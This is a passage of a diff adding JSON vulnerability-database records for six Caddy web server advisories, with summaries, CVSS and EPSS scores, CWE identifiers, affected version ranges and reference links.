+        "GHSA-hffm-g8v7-wrv7"
+      ],
+      "title": "Caddy's mTLS client authentication silently fails open when CA certificate file is missing or malformed",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, two swallowed errors in `ClientAuthentication.provision()` cause mTLS client certificate authentication to silently fail open when a CA certificate file is missing, unreadable, or malformed. The server starts without error but accepts any client certificate signed by any system-trusted CA, completely bypassing the intended private CA trust boundary. Any deployment using `trusted_ca_cert_file` or `trusted_ca_certs_pem_files` for mTLS will silently degrade to accepting any system-trusted client certificate if the CA file becomes unavailable. This can happen due to a typo in the path, file rotation, corruption, or permission changes. The server gives no indication that mTLS is misconfigured. Version 2.11.1 fixes the vulnerability.",
+      "published_at": "2026-02-23T04:24:19.000Z",
+      "modified_at": "2026-02-27T19:52:45.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.8,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00295,
+        "percentile": 0.22361,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-755"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-hffm-g8v7-wrv7",
+          "type": "advisory"
+        },
+        {
+          "url": "https://gist.github.com/moscowchill/9566c79c76c0b64c57f8bd0716f97c48",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27586",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/d42d39b4bc237c628f9a95363b28044cb7a7fe72",
+          "type": "fix"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4539",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-hffm-g8v7-wrv7",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27586",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27586",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27586",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27586",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-hffm-g8v7-wrv7",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-hffm-g8v7-wrv7",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:78b1714dc50e1ab921d05839d23b250206142c07514270e6bb201088460e0c25",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27587",
+      "aliases": [
+        "GHSA-g7pc-pc7g-h8jh"
+      ],
+      "title": "Caddy: MatchPath %xx (escaped-path) branch skips case normalization, enabling path-based route/auth bypass",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, Caddy's HTTP `path` request matcher is intended to be case-insensitive, but when the match pattern contains percent-escape sequences (`%xx`) it compares against the request's escaped path without lowercasing. An attacker can bypass path-based routing and any access controls attached to that route by changing the casing of the request path. Version 2.11.1 contains a fix for the issue.",
+      "published_at": "2026-02-23T04:24:08.000Z",
+      "modified_at": "2026-02-27T20:48:09.775Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00425,
+        "percentile": 0.37281,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-178"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-g7pc-pc7g-h8jh",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27587",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/a1081194bfae4e0d8c227ec44aecb95eded55d1e",
+          "type": "fix"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4538",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-g7pc-pc7g-h8jh",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27587",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27587",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27587",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27587",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-g7pc-pc7g-h8jh",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-g7pc-pc7g-h8jh",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:78b1714dc50e1ab921d05839d23b250206142c07514270e6bb201088460e0c25",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27588",
+      "aliases": [
+        "GHSA-x76f-jf84-rqj8"
+      ],
+      "title": "Caddy: MatchHost becomes case-sensitive for large host lists (>100), enabling host-based route/auth bypass",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, Caddy's HTTP `host` request matcher is documented as case-insensitive, but when configured with a large host list (>100 entries) it becomes case-sensitive due to an optimized matching path. An attacker can bypass host-based routing and any access controls attached to that route by changing the casing of the `Host` header. Version 2.11.1 contains a fix for the issue.",
+      "published_at": "2026-02-23T04:23:55.000Z",
+      "modified_at": "2026-02-27T20:47:36.164Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00425,
+        "percentile": 0.37281,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-178"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-x76f-jf84-rqj8",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27588",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/eec32a0bb5a11651c6a7b04ce82dc50610f2b27e",
+          "type": "fix"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4541",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-x76f-jf84-rqj8",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27588",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27588",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27588",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27588",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-x76f-jf84-rqj8",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-x76f-jf84-rqj8",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:78b1714dc50e1ab921d05839d23b250206142c07514270e6bb201088460e0c25",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27589",
+      "aliases": [
+        "GHSA-879p-475x-rqh2"
+      ],
+      "title": "Caddy vulnerable to cross-origin config application via local admin API /load (caddy)",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, the local caddy admin API (default listen `127.0.0.1:2019`) exposes a state-changing `POST /load` endpoint that replaces the entire running configuration. When origin enforcement is not enabled (`enforce_origin` not configured), the admin endpoint accepts cross-origin requests (e.g., from attacker-controlled web content in a victim browser) and applies an attacker-supplied JSON config. This can change the admin listener settings and alter HTTP server behavior without user intent. Version 2.11.1 contains a fix for the issue.",
+      "published_at": "2026-02-23T04:22:19.000Z",
+      "modified_at": "2026-02-27T20:51:24.110Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00195,
+        "percentile": 0.09272,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-352"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "2.0.0",
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-879p-475x-rqh2",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://github.com/user-attachments/files/25079818/poc.zip",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/user-attachments/files/25079820/PR_DESCRIPTION.md",
+          "type": "web"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27589",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/commit/65e0ddc22137bbbaa68c842ae0b98d0548504545",
+          "type": "fix"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4537",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-879p-475x-rqh2",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27589",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27589",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27589",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27589",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-879p-475x-rqh2",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-879p-475x-rqh2",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:88344d06ab1e1f35bc1ad1742aab0b706e4928e23ba9ab00da1e58afa60b27d2",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27590",
+      "aliases": [
+        "GHSA-5r3v-vc8m-m96g"
+      ],
+      "title": "Caddy: Unicode case-folding length expansion causes incorrect split_path index (SCRIPT_NAME/PATH_INFO confusion) in FastCGI transport",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, Caddy's FastCGI path splitting logic computes the split index on a lowercased copy of the request path and then uses that byte index to slice the original path. This is unsafe for Unicode because `strings.ToLower()` can change UTF-8 byte length for some characters. As a result, Caddy can derive an incorrect `SCRIPT_NAME`/`SCRIPT_FILENAME` and `PATH_INFO`, potentially causing a request that contains `.php` to execute a different on-disk file than intended (path confusion). In setups where an attacker can control file contents (e.g., upload features), this can lead to unintended PHP execution of non-.php files (potential RCE depending on deployment). Version 2.11.1 fixes the issue.",
+      "published_at": "2026-02-23T04:22:08.000Z",
+      "modified_at": "2026-02-27T20:52:00.327Z",
+      "severity": {
+        "level": "high",
+        "score": 8.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00614,
+        "percentile": 0.50012,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-20",
+        "CWE-180"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-5r3v-vc8m-m96g",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27590",
+          "type": "web"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4536",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-5r3v-vc8m-m96g",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27590",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27590",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27590",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27590",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-5r3v-vc8m-m96g",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-5r3v-vc8m-m96g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:78b1714dc50e1ab921d05839d23b250206142c07514270e6bb201088460e0c25",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-27585",
+      "aliases": [
+        "GHSA-4xrr-hq4w-6vf4"
+      ],
+      "title": "Caddy's improper sanitization of glob characters in file matcher may lead to bypassing security protections",
+      "summary": "Caddy is an extensible server platform that uses TLS by default. Prior to version 2.11.1, the path sanitization routine in file matcher doesn't sanitize backslashes which can lead to bypassing path related security protections. It affects users with specific Caddy and environment configurations. Version 2.11.1 fixes the issue.",
+      "published_at": "2026-02-23T04:21:54.000Z",
+      "modified_at": "2026-02-27T19:51:59.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00367,
+        "percentile": 0.31037,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-20"
+      ],
+      "affected": [
+        {
+          "product": "caddy",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "2.11.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-4xrr-hq4w-6vf4",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L361",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/blob/68d50020eef0d4c3398b878f17c8092ca5b58ca0/modules/caddyhttp/fileserver/matcher.go#L398",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.1",
+          "type": "release-notes"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27585",
+          "type": "web"
+        },
+        {
+          "url": "https://caddyserver.com/docs/caddyfile/directives#directive-order",
+          "type": "web"
+        },
+        {
+          "url": "https://pkg.go.dev/vuln/GO-2026-4535",
+          "type": "web"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-4xrr-hq4w-6vf4",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-27585",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-27585",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-27585",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-27585",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-4xrr-hq4w-6vf4",
+          "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-4xrr-hq4w-6vf4",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:41c784d38658f70df806b6399c896ab05334bdba2c1bbeed650b56bb781ef565",
+      "note": null
+    }
+  ]
+}
